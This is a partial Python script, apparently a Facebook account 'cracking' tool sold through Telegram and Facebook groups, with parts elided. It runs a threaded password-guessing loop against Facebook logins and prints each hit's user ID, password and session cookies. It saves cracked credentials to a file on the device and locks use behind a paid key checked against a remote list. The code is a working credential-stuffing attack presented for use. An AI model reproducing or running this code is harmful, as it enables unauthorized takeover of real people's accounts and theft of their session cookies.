# Gift By Alhaj
# Telegram Id : @jakareya
# Telegram : 
# Facebook Group :https://facebook.com/groups/736869400285077/
...
for ua in range(10000):
	...
	ugen.append(alhhaj)
os.system("xdg-open https://www.facebook.com/md.hacker.5070")
logo =("""
\033[1;32m ┏┳┏┓┓┏┓┏┓┳┓┏┓┓┏┏┓
\033[1;32m  ┃┣┫┃┫ ┣┫┣┫┣ ┗┫┣┫ 
\033[1;32m ┗┛┛┗┛┗┛┛┗┛┗┗┛┗┛┛┗   
\033[1;91m╔═════════════════════════╗
\033[1;92m   	ᏀᏆҒͲ ᏴƳ JAKAREYA
\033[1;91m╚═════════════════════════╝
""") 
 
 
def Subscraption():
    uuid = OWNER + str(os.geteuid()) + str(os.getlogin())
    id = "-".join(uuid)
    os.system('clear')
    print(logo)
    r1 = requests.get("https://github.com/Jakareya420/mal.txt/blob/main/mal.txt").text
    if id in r1:
        os.system('clear')
        print(logo)
    else:
        os.system('clear')
        print(logo)
        print("\t \033[1;32m THIS IS A PREMIUM TOOL SO NEED APPROVAL\033[1;97m ")
        time.sleep(1)
        os.system('clear')
        print(logo)
        print("\033[1;39m[\033[1;32m●\033[1;39m] \033[1;32m15 Days 500 Taka \033[0;92m")
        print("\033[1;39m[\033[1;32m+\033[1;39m] \033[1;32m30 Days 800 Taka \033[0;92m")
        print("\033[1;39m┏━[\033[1;32m●\033[1;39m] \033[1;32mNote : \033[0;41m Dear Bypass: User Fuck You Everyday):\033[0;92m")
        ...
        time.sleep(1.5)
        message = 'Dear Admin, Please Approve My Key To Premium. Thanks!'
        
        tks = f'https://wa.me/+8801714943212?text={message}'
...
def Alhaj():
    os.system('clear')
    os.system('xdg-open https://facebook.com/groups/736869400285077/')
    print(logo)
    print("")
    print("\033[1;96m ╔═════════════════════════════════╗")
...
def Alhajs():
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        print(f'\033[1;91m║\033[1;92m ᏀᏆҒͲ ᏴƳ JAKAREYA ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
    ...
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM JAKAREYA ')
    print("\033[1;91m╚═══════════════════════════╝")
...
def Alhajm(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'\033[1;96m[\033[1;92mJAKAREYA-SJ-ϴᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                print(f'\033[1;36mᏟϴϴᏦᏆᎬ : \033[1;35m'+coki)
                open('/sdcard/JAKAREYA-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;90m[FUCK-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
